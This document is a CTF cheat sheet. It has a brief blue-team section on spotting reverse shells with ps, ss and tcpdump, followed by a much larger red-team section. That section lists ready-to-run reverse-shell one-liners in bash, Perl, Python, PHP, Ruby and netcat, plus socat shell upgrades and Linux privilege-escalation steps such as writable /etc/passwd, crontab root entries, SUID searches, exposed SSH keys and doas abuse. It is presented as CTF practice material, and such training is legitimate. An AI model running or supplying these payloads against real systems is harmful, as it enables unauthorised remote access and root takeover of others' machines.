# ctf-resources
 Cheatsheet i gathered over my experience with ctf for blue and red teaming. Some stuff can be found on various other online resources (Such as reverse shells)

 
 Offensive and Defensive CTF	=====CheatSheet====

Blue Team:

ps -aef --forest :	View all the running processes in a neat tree way. (Easy to spot reverse shells)

each pid has a folder inside /proc

ls -la /proc/*pid* | grep cwd :	View the current working directory of that process (The attacker)

ss -anp | grep *pid* :	View the listening ports of the specific pid
ss -anpt | grep *ip pattern* : View what ips are connecting

ss -lnpt : 	View all the open ports

tcpdump -i (interface) -s 0 -w (cap or pcap outfile) (not port 22) : capture every activity on the interface which is not port 22 and save it to outfile. (-s 0 to capture the entire packet)





Red Team:

Shell Spawn (Reverse Shells):
	Bash:
		bash -i >& /dev/tcp/{ip}/{port} 0>&1
		sh -i >& /dev/udp/{ip}/{port} 0>&1
	sh:
		0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196
	
	Perl:
		perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	
	Python:
		export RHOST="{ip}";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
		
		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'		
	
	Php:
		php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'
		php -r '$sock=fsockopen("{ip}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'
		php -r '$sock=fsockopen("{ip}",{port});`/bin/sh -i <&3 >&3 2>&3`;'
		php -r '$sock=fsockopen("{ip}",{port});system("/bin/sh -i <&3 >&3 2>&3");'
		php -r '$sock=fsockopen("{ip}",{port});passthru("/bin/sh -i <&3 >&3 2>&3");'
		php -r '$sock=fsockopen("{ip}",{port});popen("/bin/sh -i <&3 >&3 2>&3", "r");'

	Ruby:
		ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

	Netcat:
		nc -e /bin/sh {ip} {port}
		nc -e /bin/bash {ip} {port}
		nc -c bash {ip} {port}
		rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f

Post Exploitation:

	Stabilize and upgrade shell
	With Python:
		python(3) -c 'import pty;pty.spawn("/bin/bash");'
		Cntl+Z 
		stty raw -echo;fg
		export TERM=xterm
	With socat:
		On Attacker:
			socat file:`tty`,raw,echo=0 tcp-listen:4444
		On Victim:
			socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:(yourip):(port)

	
	With ShellVars (Experimental):
		reset
		export SHELL=bash
		export TERM=xterm
		Cntl+Z
		stty raw -echo;fg
	
	With perl:
		perl -e 'exec "/bin/bash";'
		Cntl+Z
		stty raw -echo;fg
		export TERM=xterm

	With /bin/script:
		/bin/script /bin/bash 
		/bin/script /bin/dash


Privilege Escalation Vectors Linux:

	check for rw permissions on /etc/passwd & /etc/shadow:
		ls -l /etc/shadow
		ls -l /etc/passwd
		if passwd is writable we can write a new password for any user and completely bypass shadow file

	check for rogue suid bit programs:
		find / -type f -perm -u=s 2>/dev/null
		check gtfobins for anything out of the ordinary

	check for rogue guid bit programs:
		find / -type f -perm -g=2 2>/dev/null	

	check for crontab jobs
		cat /etc/crontab
		see if it is possible to overwrite or exploit the program that is scheduled for execution.
		(crontab -e)
	
	check for crontab permissions
		ls -l /etc/crontab
		if write permissions is available we can make a new crontab entry to run as root
		* * * * * root /path/of/program/program.(sh/py/..)
	
	check for getcap programs
		getcap -r 2>/dev/null
		exploit with shared libraries.
		check if gcc is installed otherwise this won't work!

	check for random id_rsa that are public readable on ~/.ssh of each user (even root cause who knows ~)
		ls -l /home/{user}/.ssh

	manual path:
		check for running processes to see if there's something exploitable
			ps aux
			ps -eaf --forest -- for a neat tree view

		check for listening ports.
			you might see nfs here. If you see nfs go to the nfs config files and check if there are any misconfigurations
				Misconfigurations such as no_root_squashes are gold !
	
	Check for doas command (do-as FreeBSD alternative of sudo but it is installable in linux as well):
		run doas. if you get a help prompt then you can continue with cat /usr/local/etc/doas.conf
		if you get something like this:
			permit nopass {user} as {another user} cmd rsync
			that means that you can run the specific command as that user without password.
			run doas -u {another user} command to get the command to execute
			(Similar to sudo -u {user})

	automated path:
		Upload to the box linpeas.sh or linenum.sh, chmod +x on it and run it.
		Check for kernel exploits (At the top), sudo version exploits (Also at the top)
		
		you'll be able to find out most of these from the output of the script.